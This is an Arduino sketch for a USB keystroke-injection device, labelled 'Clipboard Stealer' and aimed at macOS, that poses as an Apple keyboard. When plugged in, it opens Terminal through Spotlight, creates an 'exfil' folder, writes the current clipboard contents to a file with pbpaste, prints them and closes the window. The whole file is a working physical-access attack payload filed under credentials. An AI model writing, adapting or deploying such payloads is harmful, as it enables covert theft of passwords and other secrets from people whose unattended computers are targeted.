#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Capture current clipboard contents
  // Saves to ~/Documents/exfil/clipboard.txt
  // Author: Generated
  // Title: Clipboard Stealer
  // Target: macOS
  // Version: 1.0
  // Category: Credentials
  // ID 05ac:021e Apple:Keyboard
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("mkdir -p ~/Documents/exfil");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("pbpaste > ~/Documents/exfil/clipboard.txt");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("cat ~/Documents/exfil/clipboard.txt");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {}